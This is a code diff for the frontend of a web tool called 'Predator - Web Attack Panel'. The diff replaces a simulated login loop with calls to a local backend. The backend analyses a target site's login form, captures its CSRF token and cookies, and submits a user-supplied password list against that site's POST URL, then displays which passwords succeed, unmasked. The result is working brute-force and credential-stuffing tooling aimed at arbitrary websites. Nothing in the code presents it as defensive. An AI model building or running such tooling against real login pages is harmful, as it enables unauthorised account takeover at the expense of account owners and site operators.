@@ -1,6 +1,9 @@
 // Predator - Web Attack Panel Logic
 // This script will handle the frontend interactions and logic for the attack panel.
 
+const API_BASE_URL = 'http://127.0.0.1:5001';
+window.attackContext = {}; // Used to store data between analysis and testing steps
+
 document.addEventListener('DOMContentLoaded', () => {
     console.log('Predator script loaded and DOM fully parsed.');
 
@@ -115,93 +118,50 @@ document.addEventListener('DOMContentLoaded', () => {
             // console.log("Password file:", passwordFile.name);
             // console.log("Login URL:", loginUrl);
 
+            // Log initiation of analysis
+            console.log(`Starting form analysis for URL: ${loginUrl}`);
+
             analyzeFormButton.querySelector('.btn-text').textContent = 'Analyzing...';
             analyzeFormButton.disabled = true;
+            window.attackContext = {}; // Reset context
 
             try {
-                console.log("Attempting to fetch target page content from:", loginUrl); // Clarified log
-                const response = await fetch(loginUrl, { mode: 'cors', redirect: 'follow' }); // Added redirect: 'follow'
+                const apiResponse = await fetch(API_BASE_URL + '/analyze_url', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ url: loginUrl }),
+                });
 
-                if (!response.ok) {
-                    throw new Error(`HTTP error! status: ${response.status} ${response.statusText}`);
+                const analysis = await apiResponse.json();
+
+                if (!apiResponse.ok) {
+                    throw new Error(analysis.error || `API Error: ${apiResponse.status}`);
                 }
 
-                const htmlText = await response.text();
-                console.log("Fetched HTML (first 500 chars):", htmlText.substring(0, 500));
-
-                const parser = new DOMParser();
-                const doc = parser.parseFromString(htmlText, 'text/html');
-
-                const passwordInput = doc.querySelector('input[type="password"]');
-                let loginForm = null;
-                if (passwordInput) {
-                    loginForm = passwordInput.closest('form');
-                }
-
-                if (loginForm) {
-                    console.log("Login form found:", loginForm);
-                    const detectedPostUrlValue = new URL(loginForm.getAttribute('action') || '', loginUrl).href;
-                    const detectedPasswordFieldValue = passwordInput.getAttribute('name') || passwordInput.getAttribute('id') || '';
-
-                    // Attempt to find username field (heuristic)
-                    let detectedUsernameFieldValue = '';
-                    // Common names for username fields
-                    const usernameSelectors = [
-                        'input[name="username"]', 'input[name="email"]', 'input[name="user"]',
-                        'input[name="login"]', 'input[id="username"]', 'input[id="email"]',
-                        'input[type="text"]', 'input[type="email"]' // More generic, last resort
-                    ];
-                    for (const selector of usernameSelectors) {
-                        const userInput = loginForm.querySelector(selector);
-                        if (userInput && userInput !== passwordInput) { // Ensure it's not the password field itself
-                             // Prioritize inputs closer to the password field if multiple generic inputs are found
-                            if (selector === 'input[type="text"]' || selector === 'input[type="email"]') {
-                                let currentElement = passwordInput;
-                                let sibling = currentElement.previousElementSibling;
-                                while(sibling) {
-                                    if(sibling === userInput) {
-                                        detectedUsernameFieldValue = userInput.getAttribute('name') || userInput.getAttribute('id') || '';
-                                        break;
-                                    }
-                                    sibling = sibling.previousElementSibling;
-                                }
-                                if(detectedUsernameFieldValue) break;
-                            } else {
-                                detectedUsernameFieldValue = userInput.getAttribute('name') || userInput.getAttribute('id') || '';
-                                break;
-                            }
-                        }
-                    }
-                     if (!detectedUsernameFieldValue) { // Fallback if specific selectors fail, try any text/email input in form not password
-                        const textInputs = Array.from(loginForm.querySelectorAll('input[type="text"], input[type="email"]'));
-                        const firstNonPasswordText = textInputs.find(inp => inp !== passwordInput && (inp.getAttribute('name') || inp.getAttribute('id')));
-                        if (firstNonPasswordText) {
-                            detectedUsernameFieldValue = firstNonPasswordText.getAttribute('name') || firstNonPasswordText.getAttribute('id') || 'Could not auto-detect';
-                        } else {
-                             detectedUsernameFieldValue = 'Could not auto-detect';
-                        }
-                    }
-
-
-                    console.log("Detected POST URL:", detectedPostUrlValue);
-                    console.log("Detected Username Field:", detectedUsernameFieldValue);
-                    console.log("Detected Password Field:", detectedPasswordFieldValue);
-
-                    if (detectedUsernameFieldInput) detectedUsernameFieldInput.value = detectedUsernameFieldValue;
-                    if (detectedPasswordFieldInput) detectedPasswordFieldInput.value = detectedPasswordFieldValue;
-                    if (detectedPostUrlInput) detectedPostUrlInput.value = detectedPostUrlValue;
-
-                } else {
-                    alert("No login form with a password field could be automatically detected on the page. Please check the URL or enter parameters manually.");
-                    // Clear previous results if any
+                if (analysis.error) { // Handle errors reported by the API in a structured way
+                    alert(`Analysis Error: ${analysis.error}`);
                     if (detectedUsernameFieldInput) detectedUsernameFieldInput.value = '';
                     if (detectedPasswordFieldInput) detectedPasswordFieldInput.value = '';
                     if (detectedPostUrlInput) detectedPostUrlInput.value = '';
+                } else {
+                    console.log("Analysis successful:", analysis);
+                    if (detectedUsernameFieldInput) detectedUsernameFieldInput.value = analysis.username_field_name || '';
+                    if (detectedPasswordFieldInput) detectedPasswordFieldInput.value = analysis.password_field_name || '';
+                    if (detectedPostUrlInput) detectedPostUrlInput.value = analysis.post_url || '';
+
+                    // Store context for the next step
+                    window.attackContext.formMethod = analysis.form_method;
+                    window.attackContext.csrfTokenName = analysis.csrf_token_name;
+                    window.attackContext.csrfTokenValue = analysis.csrf_token_value;
+                    window.attackContext.initialCookies = analysis.cookies;
+                    window.attackContext.analyzedUrl = loginUrl; // Store the URL that was analyzed
                 }
 
             } catch (error) {
-                console.error("Error during form analysis:", error);
-                alert("Could not fetch or analyze the login page. This might be due to network issues, CORS restrictions, or an invalid URL. For accurate analysis of cross-domain targets, a server-side proxy is often required. Error: " + error.message);
+                console.error("Error during form analysis call:", error);
+                alert(`Failed to analyze form: ${error.message}. Check console for details.`);
                 // Clear previous results if any
                 if (detectedUsernameFieldInput) detectedUsernameFieldInput.value = '';
                 if (detectedPasswordFieldInput) detectedPasswordFieldInput.value = '';
@@ -287,30 +247,34 @@ document.addEventListener('DOMContentLoaded', () => {
             // terminalBody is queried at the start of DOMContentLoaded.
             // It should be available once step3Panel is made active.
 
-            const username = usernameInput ? usernameInput.value.trim() : '';
-            const postUrl = detectedPostUrlInput ? detectedPostUrlInput.value.trim() : '';
+            const usernameValue = usernameInput ? usernameInput.value.trim() : ''; // Renamed for clarity
+            const targetPostUrl = detectedPostUrlInput ? detectedPostUrlInput.value.trim() : '';
             const usernameFieldName = detectedUsernameFieldInput ? detectedUsernameFieldInput.value.trim() : '';
             const passwordFieldName = detectedPasswordFieldInput ? detectedPasswordFieldInput.value.trim() : '';
             const passwordFile = passwordListInput.files.length > 0 ? passwordListInput.files[0] : null;
 
-            addLogMessage("Preparing for attack simulation...", 'info');
+            // Clear previous terminal messages
+            if (terminalBody) terminalBody.innerHTML = '';
+
+            addLogMessage(`Initiating login attempts for user "${usernameValue}" against ${targetPostUrl}...`, 'info');
+
 
             if (!passwordFile) {
                 alert("Password file not selected. Please go back and select a password file.");
-                addLogMessage("Error: Password file not selected.", 'fail');
+                addLogMessage("Error: Password file not selected. Please return to Step 1.", 'fail');
                 confirmAndProceedBtn.disabled = false;
                 confirmAndProceedBtn.textContent = 'Confirm and Proceed';
-                // Optionally switch back to step 1
+                // Switch back to step 1
                 if (step3Panel) step3Panel.classList.remove('active');
                 if (step1Panel) step1Panel.classList.add('active');
                 return;
             }
 
-            if (!postUrl ||
+            if (!targetPostUrl ||
                 !passwordFieldName || passwordFieldName === 'Could not auto-detect' ||
                 !usernameFieldName || usernameFieldName === 'Could not auto-detect') {
-                alert("Critical form parameters (POST URL, Username Field Name, or Password Field Name) are missing or were not detected properly. Please ensure form analysis was successful and confirm the detected values.");
-                addLogMessage("Error: Critical form parameters missing or invalid. Check analysis results.", 'fail');
+                alert("Critical form parameters (POST URL, Username Field Name, or Password Field Name) are missing or were not detected properly. Please ensure form analysis was successful and confirm the detected values. Return to Step 1 to re-analyze if needed.");
+                addLogMessage("Error: Critical form parameters missing or invalid. Check analysis results. Return to Step 1 to re-analyze.", 'fail');
                 confirmAndProceedBtn.disabled = false;
                 confirmAndProceedBtn.textContent = 'Confirm and Proceed';
                 if (step3Panel) step3Panel.classList.remove('active');
@@ -318,64 +282,81 @@ document.addEventListener('DOMContentLoaded', () => {
                 return;
             }
 
-            addLogMessage(`Target URL: ${postUrl}`, 'info');
+            // addLogMessage(`Target URL: ${targetPostUrl}`, 'info'); // Already logged by the new message
             addLogMessage(`Username Field: ${usernameFieldName}`, 'info');
             addLogMessage(`Password Field: ${passwordFieldName}`, 'info');
-            addLogMessage(`Username/Email: ${username}`, 'info');
-
+            // addLogMessage(`Username/Email: ${usernameValue}`, 'info'); // Already logged by the new message
 
             try {
                 addLogMessage(`Reading passwords from ${passwordFile.name}...`, 'info');
                 const passwords = await readPasswordsFromFile(passwordFile);
-                addLogMessage(`Successfully read ${passwords.length} passwords. Starting simulation...`, 'info');
+                addLogMessage(`Successfully read ${passwords.length} passwords. Starting tests...`, 'info');
 
                 const attemptsCountEl = document.querySelector('#step3 .metrics-hud .hud-pod:nth-child(1) .hud-value');
                 const hitsCountEl = document.querySelector('#step3 .metrics-hud .hud-pod:nth-child(2) .hud-value');
-                // Fails count can be derived or logged directly. The current HTML doesn't have a dedicated "FAILS" counter in HUD.
 
-                let attempts = 0;
-                let hits = 0;
+                let totalAttempts = 0;
+                let totalHits = 0;
 
-                if (attemptsCountEl) attemptsCountEl.textContent = attempts;
-                if (hitsCountEl) hitsCountEl.textContent = hits;
+                if (attemptsCountEl) attemptsCountEl.textContent = totalAttempts;
+                if (hitsCountEl) hitsCountEl.textContent = totalHits;
 
+                const payload = {
+                    target_post_url: targetPostUrl,
+                    username_field_name: usernameFieldName,
+                    password_field_name: passwordFieldName,
+                    form_method: window.attackContext.formMethod || 'POST',
+                    csrf_token_name: window.attackContext.csrfTokenName,
+                    csrf_token_value: window.attackContext.csrfTokenValue,
+                    cookies: window.attackContext.initialCookies,
+                    username: usernameValue,
+                    password_list: passwords
+                };
 
-                for (const password of passwords) {
-                    attempts++;
-                    // SIMULATING LOGIN ATTEMPT DUE TO CLIENT-SIDE CORS LIMITATIONS
-                    // In a real scenario, this would be an actual fetch POST request:
-                    // const formData = new FormData();
-                    // formData.append(usernameFieldName, username);
-                    // formData.append(passwordFieldName, password);
-                    // try {
-                    //   const response = await fetch(postUrl, { method: 'POST', body: formData, mode: 'no-cors' }); // no-cors for opaque response
-                    //   // Check response.status or response.ok if not opaque. For opaque, can't know success/fail from client.
-                    // } catch (e) { addLogMessage(`Network error during attempt for ${password}: ${e.message}`, 'fail'); }
+                const apiResponse = await fetch(API_BASE_URL + '/test_credentials', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload),
+                });
 
-                    addLogMessage(`[ATTEMPT ${attempts}] Trying ${username} / ${password.substring(0,1)}***${password.substring(password.length-1)}`, 'info');
+                const results = await apiResponse.json();
 
+                if (!apiResponse.ok) {
+                    throw new Error(results.error || `API Error: ${apiResponse.status}`);
+                }
 
-                    // Simulate success/failure for demonstration
-                    if (password === 'P@ssw0rd!_2025') { // Example password from original HTML comments
-                        hits++;
-                        addLogMessage(`[HIT] Credentials accepted: ${username} / ${password}`, 'success');
-                         if (hitsCountEl) hitsCountEl.textContent = hits;
-                    } else {
-                        addLogMessage(`[FAIL] Credentials rejected: ${username} / ${password.substring(0,1)}***${password.substring(password.length-1)}`, 'fail');
+                for (const result_item of results) {
+                    totalAttempts++;
+                    let displayPassword = result_item.password; // Show full password from backend if available
+                    if (typeof displayPassword === 'string' && displayPassword.length > 2) {
+                         // Mask if still desired, though backend now returns it
+                         // displayPassword = `${displayPassword.substring(0,1)}***${displayPassword.substring(displayPassword.length-1)}`;
+                    } else if (typeof displayPassword !== 'string') {
+                        displayPassword = "N/A"; // Should not happen if backend sends string
                     }
 
-                    if (attemptsCountEl) attemptsCountEl.textContent = attempts;
 
-                    await new Promise(resolve => setTimeout(resolve, 100)); // 100ms delay for simulation visibility
+                    addLogMessage(`[${result_item.status.toUpperCase()}] User: ${usernameValue} / Pass: ${displayPassword} - ${result_item.details}`, result_item.status);
+
+                    if (result_item.status === 'success') {
+                        totalHits++;
+                    }
+                    if (attemptsCountEl) attemptsCountEl.textContent = totalAttempts;
+                    if (hitsCountEl) hitsCountEl.textContent = totalHits;
+
+                    // Add a small delay for observable output, even though results come at once
+                    await new Promise(resolve => setTimeout(resolve, 50));
                 }
-                addLogMessage("Attack simulation finished.", 'info');
+                addLogMessage("All credential tests finished.", 'info');
 
             } catch (error) {
-                console.error("Error during password testing:", error);
+                console.error("Error during password testing call:", error);
                 addLogMessage(`Error: ${error.message}`, 'fail');
-                alert(`An error occurred: ${error.message}`);
+                alert(`An error occurred during credential testing: ${error.message}`);
             } finally {
-                confirmAndProceedBtn.disabled = false; // Re-enable after loop
+                confirmAndProceedBtn.disabled = false;
                 confirmAndProceedBtn.textContent = 'Confirm and Proceed';
                 // User stays on Step 3 to see results
             }
